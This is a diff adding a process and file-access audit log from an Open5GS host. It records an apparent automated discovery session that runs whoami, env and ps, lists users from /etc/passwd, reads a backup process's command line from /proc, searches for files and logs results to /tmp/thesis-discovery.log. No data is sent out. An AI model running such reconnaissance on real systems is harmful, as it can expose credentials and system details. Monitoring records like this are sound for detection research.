@@ -1,0 +1,983 @@
+2026-10-02T20:01:04.025586592Z | EXEC | PID=946842 | PPID=937778 | /bin/sh | -c pwd
+2026-10-02T20:01:38.910434045Z | EXEC | PID=947937 | PPID=937778 | /bin/sh | -c "ls -1 "$PWD"/* 2>/dev/null | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:01:38.912681689Z | EXEC | PID=947938 | PPID=947937 | /bin/ls | -1 /opt/open5gs/bin /opt/open5gs/etc /opt/open5gs/lib /opt/open5gs/splunkd /opt/open5gs/var
+2026-10-02T20:01:38.913117267Z | EXEC | PID=947939 | PPID=947937 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:01:38.916349840Z | READ | PID=947938 | /bin/ls | /opt/open5gs/bin
+2026-10-02T20:01:38.916383842Z | READ | PID=947938 | /bin/ls | /opt/open5gs/bin
+2026-10-02T20:01:38.916407902Z | READ | PID=947938 | /bin/ls | /opt/open5gs/bin
+2026-10-02T20:01:38.916438639Z | READ | PID=947938 | /bin/ls | /opt/open5gs/bin
+2026-10-02T20:01:38.916472783Z | READ | PID=947938 | /bin/ls | /opt/open5gs/bin
+2026-10-02T20:01:38.916545193Z | READ | PID=947938 | /bin/ls | /opt/open5gs/bin
+2026-10-02T20:01:38.916641545Z | READ | PID=947938 | /bin/ls | /opt/open5gs/etc
+2026-10-02T20:01:38.916663384Z | READ | PID=947938 | /bin/ls | /opt/open5gs/etc
+2026-10-02T20:01:38.916674396Z | READ | PID=947938 | /bin/ls | /opt/open5gs/etc
+2026-10-02T20:01:38.916687800Z | READ | PID=947938 | /bin/ls | /opt/open5gs/etc
+2026-10-02T20:01:38.916697866Z | READ | PID=947938 | /bin/ls | /opt/open5gs/etc
+2026-10-02T20:01:38.916717911Z | READ | PID=947938 | /bin/ls | /opt/open5gs/etc
+2026-10-02T20:01:38.916765318Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916782534Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916899136Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916919258Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916935845Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916951039Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916967707Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.916991599Z | READ | PID=947938 | /bin/ls | /opt/open5gs/lib
+2026-10-02T20:01:38.917033809Z | READ | PID=947938 | /bin/ls | /opt/open5gs/var
+2026-10-02T20:01:38.917050160Z | READ | PID=947938 | /bin/ls | /opt/open5gs/var
+2026-10-02T20:01:38.917070861Z | READ | PID=947938 | /bin/ls | /opt/open5gs/var
+2026-10-02T20:01:38.917084624Z | READ | PID=947938 | /bin/ls | /opt/open5gs/var
+2026-10-02T20:01:38.917099977Z | READ | PID=947938 | /bin/ls | /opt/open5gs/var
+2026-10-02T20:01:38.917119102Z | READ | PID=947938 | /bin/ls | /opt/open5gs/var
+2026-10-02T20:02:24.020608907Z | EXEC | PID=949349 | PPID=937778 | /bin/sh | -c "whoami | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:02:24.024239674Z | EXEC | PID=949350 | PPID=949349 | /usr/bin/whoami | 
+2026-10-02T20:02:24.024581953Z | EXEC | PID=949351 | PPID=949349 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:03:24.069753021Z | EXEC | PID=951183 | PPID=937778 | /bin/sh | -c "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#' | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:03:24.072514394Z | EXEC | PID=951184 | PPID=951183 | /usr/bin/cut | -d: -f1 /etc/passwd
+2026-10-02T20:03:24.073497382Z | EXEC | PID=951186 | PPID=951183 | /bin/grep | -v #
+2026-10-02T20:03:24.073501699Z | EXEC | PID=951187 | PPID=951183 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:03:24.073770522Z | EXEC | PID=951185 | PPID=951183 | /bin/grep | -v _
+2026-10-02T20:04:23.962136876Z | EXEC | PID=953003 | PPID=937778 | /bin/sh | -c groups
+2026-10-02T20:04:23.964213246Z | EXEC | PID=953005 | PPID=953003 | /usr/bin/groups | 
+2026-10-02T20:05:11.667836887Z | EXEC | PID=954467 | PPID=937778 | /bin/sh | -c "env | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:05:11.669991573Z | EXEC | PID=954468 | PPID=954467 | /usr/bin/env | 
+2026-10-02T20:05:11.672430898Z | EXEC | PID=954469 | PPID=954467 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:06:09.691865623Z | EXEC | PID=956355 | PPID=937778 | /bin/sh | -c "ps aux"
+2026-10-02T20:06:09.694413425Z | EXEC | PID=956356 | PPID=956355 | /bin/ps | aux
+2026-10-02T20:06:50.930894337Z | EXEC | PID=957594 | PPID=937778 | /bin/sh | -c "/opt/open5gs/bin/open5gs-db-status --help; cat /proc/$(pgrep -f open5gs-db-backup | head -1)/cmdline; /opt/open5gs/bin/open5gs-db-backup --help;"
+2026-10-02T20:06:50.933612064Z | EXEC | PID=957597 | PPID=957596 | /usr/bin/pgrep | -f open5gs-db-backup
+2026-10-02T20:06:50.933726029Z | EXEC | PID=957598 | PPID=957596 | /usr/bin/head | -1
+2026-10-02T20:06:50.940743095Z | EXEC | PID=957599 | PPID=957594 | /bin/cat | /proc/89/cmdline
+2026-10-02T20:07:47.948869043Z | EXEC | PID=959367 | PPID=937778 | /bin/sh | -c "find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:07:47.950918316Z | EXEC | PID=959369 | PPID=959367 | /usr/bin/head | -5
+2026-10-02T20:07:47.950997221Z | EXEC | PID=959370 | PPID=959367 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:07:47.951190900Z | EXEC | PID=959368 | PPID=959367 | /usr/bin/find | / -name *.wav -type f -not -path */\.* -size -500k
+2026-10-02T20:07:48.033340554Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033492209Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033554438Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033574716Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033601990Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033628107Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033667211Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033706932Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:07:48.033771689Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:07:48.033804137Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:07:48.033898828Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:07:48.033930746Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:07:48.034010161Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:07:48.034090974Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:07:48.034216626Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:07:48.034254843Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:07:48.034301327Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:07:48.034332439Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:07:48.034386348Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:07:48.034428383Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:07:48.034553484Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:07:48.034569333Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:07:48.034579064Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:07:48.034598242Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:07:48.034594148Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:07:48.034605438Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:07:48.034658381Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:07:48.034664918Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:07:48.034681674Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:07:48.034687413Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:07:48.034700780Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:07:48.034715275Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:07:48.034763970Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:07:48.034770291Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:07:48.034787046Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:07:48.034791862Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:07:48.034805559Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:07:48.034818857Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:07:48.034854620Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:07:48.034865478Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:07:48.034887732Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:07:48.034893966Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:07:48.034910332Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:07:48.034921994Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:07:48.034970573Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:07:48.034977786Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:07:48.035013092Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:07:48.035019387Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:07:48.035058477Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:07:48.035081814Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:07:48.035153404Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:07:48.035161157Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:07:48.035169740Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:07:48.035175636Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:07:48.035182318Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:07:48.035191235Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:07:48.035260663Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:07:48.035279469Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:07:48.035297224Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:07:48.035311605Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:07:48.035331295Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:07:48.035349014Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:07:48.035442138Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:07:48.035460802Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:07:48.035478281Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:07:48.035488386Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:07:48.035513465Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:07:48.035526570Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:07:48.035611444Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:07:48.035628601Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:07:48.035660759Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:07:48.035675678Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:07:48.035690438Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:07:48.035707637Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:07:48.035770184Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:07:48.035787017Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:07:48.035818229Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:07:48.035831373Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:07:48.035847251Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:07:48.035862666Z | READ | PID=959368 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:08:42.227976110Z | EXEC | PID=960971 | PPID=937778 | /bin/sh | -c "find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:08:42.230067559Z | EXEC | PID=960972 | PPID=960971 | /usr/bin/find | / -name *.png -type f -not -path */\.* -size -500k
+2026-10-02T20:08:42.230198036Z | EXEC | PID=960973 | PPID=960971 | /usr/bin/head | -5
+2026-10-02T20:08:42.230896609Z | EXEC | PID=960974 | PPID=960971 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:08:42.290027013Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290046665Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290055717Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290060615Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290066432Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290071108Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290077080Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290087609Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:08:42.290123244Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:08:42.290129975Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:08:42.290187705Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:08:42.290192816Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:08:42.290242463Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:08:42.290278651Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:08:42.290346810Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:08:42.290354892Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:08:42.290392940Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:08:42.290400674Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:08:42.290411214Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:08:42.290423465Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:08:42.290531671Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:08:42.290538545Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:08:42.290547956Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:08:42.290552911Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:08:42.290559041Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:08:42.290568489Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:08:42.290679510Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:08:42.290721418Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:08:42.290759604Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:08:42.290812588Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:08:42.290863569Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:08:42.293863489Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:08:42.293931169Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:08:42.293950241Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:08:42.293969247Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:08:42.293981962Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:08:42.293997219Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:08:42.294014894Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:08:42.294063984Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:08:42.294080666Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:08:42.294092335Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:08:42.294104908Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:08:42.294113652Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:08:42.294131509Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:08:42.294187793Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:08:42.294207420Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:08:42.294232416Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:08:42.294245517Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:08:42.294265951Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:08:42.294292331Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:08:42.294415409Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:08:42.294431668Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:08:42.294441210Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:08:42.294454619Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:08:42.294461366Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:08:42.294479021Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var
+2026-10-02T20:08:42.294526179Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:08:42.294542576Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:08:42.294551630Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:08:42.294564116Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:08:42.294571416Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:08:42.294586564Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log
+2026-10-02T20:08:42.294624348Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:08:42.294640555Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:08:42.294649447Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:08:42.294654471Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:08:42.294660711Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:08:42.294676864Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs
+2026-10-02T20:08:42.294725743Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:08:42.294741927Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:08:42.294752175Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:08:42.294764968Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:08:42.294772480Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:08:42.294787434Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/var/log/open5gs/tls
+2026-10-02T20:08:42.294842318Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:08:42.294848651Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:08:42.294864870Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:08:42.294869102Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:08:42.294894096Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:08:42.294910112Z | READ | PID=960972 | /usr/bin/find | /opt/open5gs/bin
+2026-10-02T20:09:20.759297220Z | EXEC | PID=962136 | PPID=937778 | /bin/sh | -c "find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log"
+2026-10-02T20:09:20.761571651Z | EXEC | PID=962137 | PPID=962136 | /usr/bin/find | / -name *.yml -type f -not -path */\.* -size -500k
+2026-10-02T20:09:20.761713506Z | EXEC | PID=962138 | PPID=962136 | /usr/bin/head | -5
+2026-10-02T20:09:20.761945109Z | EXEC | PID=962139 | PPID=962136 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:09:20.817102650Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817125319Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817135411Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817140466Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817146859Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817151294Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817157641Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817168437Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib
+2026-10-02T20:09:20.817207027Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:09:20.817222324Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:09:20.817287817Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:09:20.817301061Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:09:20.817372439Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:09:20.817429628Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu
+2026-10-02T20:09:20.817499892Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:09:20.817515413Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:09:20.817529266Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:09:20.817541072Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:09:20.817550950Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:09:20.817562406Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/lib/x86_64-linux-gnu/freeDiameter
+2026-10-02T20:09:20.817661021Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:09:20.817675650Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:09:20.817685774Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:09:20.817697092Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:09:20.817705844Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:09:20.817721960Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:09:20.817761460Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:09:20.817775849Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:09:20.817793327Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:09:20.817805694Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:09:20.817818698Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:09:20.817833507Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:09:20.817891213Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:09:20.817905536Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:09:20.817921715Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:09:20.817927696Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:09:20.817941704Z | READ | PID=962137 | /usr/bin/find | /opt/open5gs/etc/open5gs
